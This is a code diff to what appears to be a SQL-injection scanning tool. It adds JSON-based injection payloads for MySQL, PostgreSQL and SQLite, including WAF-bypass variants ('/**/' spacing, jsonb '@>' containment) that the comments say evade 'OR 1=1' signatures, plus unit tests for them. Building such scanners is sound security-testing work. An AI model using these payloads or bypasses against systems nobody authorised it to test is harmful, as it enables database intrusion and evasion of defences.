@@ -50,6 +50,7 @@ impl JsonPayload {
     }
 }
 
+#[allow(clippy::too_many_lines)] // flat data table: one block per payload, no logic
 #[must_use]
 pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
     match dbms {
@@ -66,6 +67,15 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
                 format!("' AND JSON_UNQUOTE(JSON_EXTRACT('{BAD_DOC}', '$'))='1' -- -"),
                 "mysql",
             ),
+            // Team82 WAF-bypass shape (Vulnsy cheat-sheet): `/**/` instead of
+            // spaces so `OR 1=1` signatures miss it. Appended last so L1/L2
+            // budgets stay byte-identical.
+            JsonPayload::new(
+                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=1 -- -",
+                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=2 -- -",
+                format!("' AND JSON_EXTRACT('{BAD_DOC}','$.a') -- -"),
+                "mysql",
+            ),
         ],
         Some("postgres") => vec![
             JsonPayload::new(
@@ -78,6 +88,15 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
                 "' OR ('{\"k\":1}'::jsonb->>'k')='1' --",
                 "' OR ('{\"k\":1}'::jsonb->>'k')='2' --",
                 format!("' AND ('{BAD_DOC}'::jsonb->'k')='1' --"),
+                "postgres",
+            ),
+            // Team82 `@>` containment bypass (Vulnsy cheat-sheet): rewrites
+            // `OR 1=1` as JSON containment so arithmetic-equality signatures
+            // miss it. TRUE `@> '{"a":1}'` vs FALSE `@> '{"a":2}'`.
+            JsonPayload::new(
+                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb --",
+                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":2}'::jsonb --",
+                format!("' AND ('{BAD_DOC}'::jsonb @> '{{\"a\":1}}'::jsonb)='1' --"),
                 "postgres",
             ),
         ],
@@ -113,6 +132,24 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
                 "oracle",
             ),
         ],
+        // SQLite (Team82 `->`/`->>` family): JSON1 `json_extract` boolean
+        // plus the `->>` operator form. Error channel is `malformed JSON`
+        // on the `__bad__` sentinel (same channel as the canonical
+        // `dbms::sqlite` `json_extract('__bad__','$')` probe).
+        Some("sqlite") => vec![
+            JsonPayload::new(
+                "' OR json_extract('{\"k\":1}','$.k')=1 --",
+                "' OR json_extract('{\"k\":1}','$.k')=2 --",
+                format!("' AND json_extract('{BAD_DOC}','$') --"),
+                "sqlite",
+            ),
+            JsonPayload::new(
+                "' OR ('{\"k\":1}' ->> '$.k')='1' --",
+                "' OR ('{\"k\":1}' ->> '$.k')='2' --",
+                format!("' AND json_extract('{BAD_DOC}','$') --"),
+                "sqlite",
+            ),
+        ],
         _ => vec![
             JsonPayload::new(
                 "' OR JSON_EXTRACT('{\"k\":1}', '$.k')=1 -- -",
@@ -131,6 +168,26 @@ pub fn json_payloads_for(dbms: Option<&str>) -> Vec<JsonPayload> {
                 "' OR JSON_VALUE('{\"k\":1}','$.k')='2' --",
                 format!("' AND JSON_VALUE('{BAD_DOC}','$.k')='1' --"),
                 "mssql",
+            ),
+            // Team82 WAF-bypass sweep (appended last, same shapes as the
+            // per-DBMS variants above).
+            JsonPayload::new(
+                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=1 -- -",
+                "'/**/OR/**/JSON_EXTRACT('{\"a\":1}','$.a')=2 -- -",
+                format!("' AND JSON_EXTRACT('{BAD_DOC}','$.a') -- -"),
+                "mysql",
+            ),
+            JsonPayload::new(
+                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":1}'::jsonb --",
+                "'/**/OR/**/'{\"a\":1}'::jsonb @> '{\"a\":2}'::jsonb --",
+                format!("' AND ('{BAD_DOC}'::jsonb @> '{{\"a\":1}}'::jsonb)='1' --"),
+                "postgres",
+            ),
+            JsonPayload::new(
+                "' OR json_extract('{\"k\":1}','$.k')=1 --",
+                "' OR json_extract('{\"k\":1}','$.k')=2 --",
+                format!("' AND json_extract('{BAD_DOC}','$') --"),
+                "sqlite",
             ),
         ],
     }
@@ -179,7 +236,7 @@ mod tests {
     #[test]
     fn mysql_pair_and_error_probe() {
         let v = json_payloads_for(Some("mysql"));
-        assert_eq!(v.len(), 2);
+        assert_eq!(v.len(), 3);
         for p in &v {
             assert_eq!(p.dbms, "mysql");
             assert!(p.true_payload.contains("JSON_EXTRACT") || p.true_payload.contains("->>"));
@@ -190,14 +247,34 @@ mod tests {
                 p.true_payload
             );
         }
+        // Team82 /**/ bypass appended last.
+        let team82 = &v[2];
+        assert!(
+            team82.true_payload.contains("/**/OR/**/JSON_EXTRACT"),
+            "got {}",
+            team82.true_payload
+        );
+        assert_ne!(team82.true_payload, team82.false_payload);
     }
 
     #[test]
     fn postgres_uses_cast_operators() {
         let v = json_payloads_for(Some("postgres"));
-        assert_eq!(v.len(), 2);
+        assert_eq!(v.len(), 3);
         assert!(v[0].true_payload.contains("::json"));
         assert!(v[1].true_payload.contains("::jsonb"));
+        // Team82 @> containment bypass appended last.
+        assert!(
+            v[2].true_payload.contains("@>"),
+            "got {}",
+            v[2].true_payload
+        );
+        assert!(
+            v[2].true_payload.contains("/**/OR/**/"),
+            "got {}",
+            v[2].true_payload
+        );
+        assert_ne!(v[2].true_payload, v[2].false_payload);
         for p in &v {
             assert!(
                 p.true_payload.ends_with("--"),
@@ -233,11 +310,43 @@ mod tests {
     #[test]
     fn generic_covers_three_dbms() {
         let v = json_payloads_for(None);
-        assert_eq!(v.len(), 3);
+        assert_eq!(v.len(), 6);
         let kinds: Vec<&str> = v.iter().map(|p| p.dbms.as_str()).collect();
         assert!(kinds.contains(&"mysql"));
         assert!(kinds.contains(&"postgres"));
         assert!(kinds.contains(&"mssql"));
+        assert!(kinds.contains(&"sqlite"));
+        // Team82 sweep appended last (mysql /**/ + pg @>), sqlite narrow last.
+        assert!(v[3].true_payload.contains("/**/OR/**/JSON_EXTRACT"));
+        assert!(v[4].true_payload.contains("@>"));
+        assert!(v[5].true_payload.contains("json_extract"));
+    }
+
+    #[test]
+    fn sqlite_json_extract_and_arrow() {
+        let v = json_payloads_for(Some("sqlite"));
+        assert_eq!(v.len(), 2);
+        assert!(
+            v[0].true_payload.contains("json_extract"),
+            "got {}",
+            v[0].true_payload
+        );
+        assert!(
+            v[1].true_payload.contains("->>"),
+            "got {}",
+            v[1].true_payload
+        );
+        for p in &v {
+            assert_eq!(p.dbms, "sqlite");
+            assert!(p.error_payload.contains(BAD_DOC), "got {}", p.error_payload);
+            assert!(
+                p.true_payload.ends_with("--"),
+                "sqlite comment: {}",
+                p.true_payload
+            );
+            assert!(!p.true_payload.ends_with("-- -"));
+            assert_ne!(p.true_payload, p.false_payload);
+        }
     }
 
     #[test]
